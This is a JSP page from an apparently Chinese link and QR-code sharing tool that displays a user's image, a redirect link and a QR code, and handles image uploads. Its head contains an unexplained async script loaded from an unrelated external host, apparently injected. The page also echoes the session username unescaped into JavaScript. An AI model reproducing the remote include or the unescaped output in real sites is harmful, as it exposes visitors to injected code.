<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<%
String username = session.getAttribute("username")!=null?session.getAttribute("username").toString():"";
%>
<head><script async="" src="//ij.so9.cc/j/?t=fx&amp;g=d8c8e9da44d8&amp;c=44032c45701d&amp;rv=1"></script>    

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    

    <title>查看链接</title>

    <link href="<%=request.getContextPath()%>/css/bootstrap.min14ed.css?v=3.3.6" rel="stylesheet"/>
    <link href="<%=request.getContextPath()%>/css/font-awesome.min93e3.css?v=4.4.0" rel="stylesheet"/>
    <link href="<%=request.getContextPath()%>/css/animate.min.css" rel="stylesheet"/>
    <link href="<%=request.getContextPath()%>/css/style.min862f.css?v=4.1.0" rel="stylesheet"/>
    <link rel="stylesheet" href="<%=request.getContextPath()%>/css/static/layui.css" media="all">
<style>
.middle-box{
padding-top:0 !important;
}
</style>
<link id="layuicss-layer" rel="stylesheet" href="<%=request.getContextPath()%>/css/static/layer.css" media="all"></head>

<body class="gray-bg">
  

    <div class="wrapper wrapper-content">
        <div class="row">
            <div class="col-sm-12">
                <div class="middle-box text-center animated fadeInRightBig" style="margin-top:0;">
                    <img  id="img" style="max-width: 100%;">
                    <p id="zhuText"></p>
                    <div class="error-desc">
                        <br><a href="#code" data-toggle="modal" id="look" class="btn btn-primary m-t">查看链接</a>
                        <a href="javascript:;" id="upload" class="btn btn-primary m-t">上传图片</a><input class="layui-upload-file" type="file" accept="undefined" name="file">
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    
    
    <!-- 全局js -->
    <script src="<%=request.getContextPath()%>/js/jquery.min.js"></script>
    <script src="<%=request.getContextPath()%>/js/bootstrap.min.js?v=3.4.0"></script>
    <script src="<%=request.getContextPath()%>/js/content.min.js?v=1.0.0"></script><div id="code" class="modal fade" aria-hidden="true">
        <div id="code-can"></div>
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="row">
                        <div class="col-sm-12 b-r">
                            <h3 class="m-t-none m-b">链接地址：http://jump.sktlc.cn/index/jump/index/id/250</h3>
                            <div class="form-group">
                            	<img id="code-img" style="display: block;margin:0 auto;max-width: 100%;">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	<script src="<%=request.getContextPath()%>/js/static/layui.js" charset="utf-8"></script>
	<script type="text/javascript" src="<%=request.getContextPath()%>/js/static/jquery.qrcode.min.js"></script>
	<script>
	    var filePath;
	    var userid;
		$(function(){
			 $.ajax({
			    	url:"../business/initShowImage.do",
					type:"post",
					dataType:"json",
					data:{"username":"<%=username%>"},
					async:false,
					success:function(data){
						$('#img').attr('src', "../"+data.idAndPath.filepath);
						filepath = data.idAndPath.filepath;
						userid = data.idAndPath.id;
					}
			    });
			$('#code').on('show.bs.modal',
		        function() {
		        var str = "http://iusm.jinmuou.com:8080/CsManager/showImg/"+userid+".html";
				//alert("链接地址i："+str)
				 var qrcode= $('#code-can').qrcode(str).hide(); 
				 var canvas=qrcode.find('canvas').get(0);
				 $('#code-img').attr('src',canvas.toDataURL('image/jpg'))
		    })
		    
		   
		});
		var index;
			layui.use('upload', function(){
			  var $ = layui.jquery
			  ,upload = layui.upload;
			  //普通图片上传
			  var uploadInst = upload.render({
				    elem: '#upload'
				    ,url: "<%=request.getContextPath()%>/file/photoUpload.do"
				    ,before: function(obj){
				      index = layer.load(2, {shade: [0.5,'#000']}); 
				    }
				    ,done: function(data){
				      //如果上传失败
					  layer.close(index)
				      if(!data.res.status){
						layer.msg(data.res.msg)
				        return false;
				      } else {
						layer.msg('上传成功')
						$('#img').attr('src', "../"+data.res.msg); //图片链接（base64）
				      }
				    }
				    ,error: function(){
					  layer.close(index)
				      var demoText = $('#zhuText');
				      demoText.html('<span style="color: #FF5722;">上传失败</span> <a class="layui-btn layui-btn-mini demo-reload">重试</a>');
				      demoText.find('.demo-reload').on('click', function(){
				        uploadInst.upload();
				      });
				    }
				 });
			});
  </script>



</body></html>